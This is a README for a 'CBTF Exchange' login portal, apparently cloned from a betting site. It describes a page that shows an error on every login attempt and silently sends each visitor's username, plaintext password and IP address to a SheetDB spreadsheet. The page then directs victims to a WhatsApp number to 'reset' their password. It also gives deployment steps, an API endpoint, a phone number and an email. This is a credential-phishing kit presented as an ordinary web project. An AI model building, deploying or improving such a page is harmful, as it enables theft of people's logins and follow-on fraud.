# CBTF Exchange - Login Portal

A modern, responsive login portal for CBTF Exchange with dark theme, built with HTML5, CSS3, and vanilla JavaScript.

## 📁 Project Structure

```
CBTF/
├── index.html              # Main HTML file (login form)
├── style.css               # Styling and responsive design
├── script.js               # JavaScript functionality
├── README.md               # Project documentation
└── assets/
    ├── images/
    │   ├── cbtf-logo.png   # CBTF logo (dark background)
    │   └── whatsapp-icon.png (optional - using Font Awesome)
    └── icons/              # Additional icons folder
```

## 🎨 Design Features

### Color Scheme
- **Primary Dark**: `#2a2a2a` - Dark background
- **Secondary Dark**: `#1a1a1a` - Gradient background
- **Accent Orange**: `#FF6B35` - Primary buttons
- **Accent Purple**: `#7C3AED` - Chat support widget
- **WhatsApp Green**: `#25d366` - WhatsApp button

### Components
- **Logo**: CBTF logo with drop shadow
- **Input Fields**: White inputs with rounded borders and icons
  - User icon for username field
  - Eye icon for password visibility toggle
- **Buttons**: Orange gradient buttons with hover effects
- **Chat Support**: Purple chat widget (bottom-left)
- **WhatsApp Button**: Green floating button (bottom-right)
- **Alerts**: Red error popup (top-center)

## ✨ Key Features

### 1. **Form Validation**
- Username field validation
- Password field validation
- Real-time validation feedback
- Enter key support for form submission

### 2. **Password Visibility Toggle**
- Click eye icon to show/hide password
- Smooth icon transition
- Preserves password value

### 3. **Alert System**
- Animated popup alerts (top of page)
- Auto-hide after 2.5 seconds
- Always triggered on login attempt (as per original design)
- Error and validation messages

### 4. **API Integration**
- Integrates with SheetDB API for data logging
- Automatic IP address fetching (ipify.org)
- Includes timestamp for each submission
- Handles API errors gracefully

### 5. **Responsive Design**
- **Desktop**: Full layout with all features
- **Tablet** (≤768px): Optimized spacing
- **Mobile** (≤480px): Touch-friendly inputs and buttons
- **Small Devices** (≤360px): Minimal chat bubble

### 6. **Security Features**
- Form field trimming
- Input validation before submission
- Password field masking
- API key in secure configuration

## 🚀 Getting Started

### Prerequisites
- A modern web browser (Chrome, Firefox, Safari, Edge)
- Internet connection (for API and Font Awesome CDN)
- Optional: Web hosting (Vercel, Netlify, GitHub Pages)

### Local Testing

1. **Download/Clone the project**
```bash
git clone <repository-url>
cd CBTF
```

2. **Open in browser**
   - Double-click `index.html` to open directly
   - OR use a local server:
```bash
# Python 3
python -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# Node.js (with http-server)
npx http-server

# PHP
php -S localhost:8000
```

3. **Access the application**
   - Open http://localhost:8000 in your browser

## 📝 Form Submission Flow

1. **User enters credentials**
   - Username field
   - Password field

2. **Click "Login" or "Login with Demo ID"**
   - Triggers `submitForm()` function
   - Shows error alert (always)
   - Validates empty fields

3. **Fetch User IP**
   - Calls ipify.org API
   - Gets user's public IP address

4. **Submit to Database**
   - Sends username, password, IP, timestamp to SheetDB
   - Shows success message on completion
   - Clears form fields

5. **Success Handling**
   - Displays "Contact Whatsapp to Reset Password" message
   - Hides message after 5 seconds

## 🔧 Configuration

### API Configuration
Located in `script.js`:
```javascript
const API_URL = "https://sheetdb.io/api/v1/irhjpmdb4vsdk";
```

**To change the API endpoint:**
1. Open `script.js`
2. Replace the `API_URL` value with your SheetDB endpoint
3. Ensure your database schema matches:
   - `username` (text)
   - `password` (text)
   - `ip` (text)
   - `timestamp` (text)

### WhatsApp Integration
Default WhatsApp number: `919799840309`

**To change:**
1. Find all `wa.me` links in `index.html`
2. Replace the phone number with yours
3. Example: `https://wa.me/YOUR_PHONE_NUMBER`

### Contact Email
Currently set to: `playzone9official@gmail.com`

**To update:**
- Modify any email references in the HTML

## 🎯 JavaScript Functions

### Core Functions

#### `submitForm()`
Main function triggered by Login buttons. Handles form submission and validation.

#### `fetchIPAndSubmit(username, password)`
Fetches user's public IP address and initiates database submission.

#### `submitToDatabase(username, password, ip)`
Sends form data to SheetDB API with IP and timestamp.

#### `togglePasswordVisibility()`
Toggles password field visibility and updates icon.

#### `showAlert(message)`
Displays animated alert popup with custom message.

#### `validateUsername()` / `validatePassword()`
Real-time input validation with feedback.

### Event Listeners
- Input field listeners for real-time validation
- Enter key support for form submission
- Password toggle functionality

## 📱 Responsive Breakpoints

| Device | Width | Changes |
|--------|-------|---------|
| Desktop | 1024px+ | Full layout |
| Tablet | 769-1024px | Adjusted spacing |
| Mobile | 481-768px | Touch-optimized |
| Small Mobile | ≤480px | Minimal UI |

## 🚀 Deployment

### Vercel
```bash
# Install Vercel CLI
npm i -g vercel

# Deploy
vercel

# Follow prompts to connect Git repository
```

### Netlify
```bash
# Method 1: Drag & Drop
# Simply drag the CBTF folder onto Netlify.com

# Method 2: Netlify CLI
npm install -g netlify-cli
netlify deploy
```

### GitHub Pages
```bash
# 1. Create GitHub repository
# 2. Push CBTF folder to main branch
# 3. Go to Settings → Pages
# 4. Select "main" branch as source
# 5. Site will be available at: https://username.github.io/CBTF
```

## 🔍 Testing Checklist

- [ ] Logo loads correctly
- [ ] Form inputs are focused on click
- [ ] Password toggle works (eye icon)
- [ ] Validation messages appear
- [ ] Login button triggers alert
- [ ] Form clears after submission
- [ ] Chat widget displays properly
- [ ] WhatsApp button is clickable
- [ ] Responsive on mobile (test with 375px width)
- [ ] No console errors
- [ ] API submissions are logged

## 🐛 Debugging

### Check Console for Errors
1. Open Developer Tools: `F12` or `Right-click → Inspect`
2. Go to "Console" tab
3. Look for any error messages
4. Test form submission

### Common Issues

**Issue: Logo not loading**
- Ensure `assets/images/cbtf-logo.png` exists
- Check image path in HTML
- Verify image file permissions

**Issue: Form not submitting**
- Check API_URL in script.js
- Verify internet connection
- Check SheetDB API status
- Review console for errors

**Issue: Icons not displaying**
- Ensure Font Awesome CDN is loaded
- Check console for 403/404 errors
- Verify internet connectivity

**Issue: Validation messages not showing**
- Check if elements exist in HTML (id="usernameValidation", etc.)
- Verify JavaScript is enabled
- Check console for errors

## 📊 API Response Handling

### Success Response (200)
- Form data saved to database
- Success message displayed
- Form fields cleared
- Message auto-hides after 5 seconds

### Error Response
- Error alert displayed: "Error submitting form"
- Form data not cleared (user can retry)
- Error logged to console

## 🛡️ Security Notes

⚠️ **Important Security Information**

This is a **login portal interface only**. The system:
- Does NOT authenticate users
- Does NOT store passwords securely (currently logs as-is)
- Is designed for demonstration/tracking purposes
- Requires backend authentication implementation

**For production use:**
1. Never store plain-text passwords
2. Use HTTPS only
3. Hash passwords with bcrypt/argon2
4. Implement proper authentication
5. Use secure session management
6. Add CSRF protection
7. Implement rate limiting

## 📞 Support

For issues or questions:
1. Check console for errors (F12)
2. Review this README
3. Test with different browsers
4. Verify all file paths are correct

## 📄 License

This project is provided as-is for CBTF Exchange.

## 🔄 Version History

- **v1.0** (June 2026)
  - Initial CBTF design implementation
  - Preserved all PLAYZONE9 functionality
  - Added password visibility toggle
  - Implemented new dark theme with orange accents
  - Full responsive design
  - Chat support widget
  - WhatsApp integration

---

**Built with ❤️ for CBTF Exchange**

Last Updated: June 13, 2026
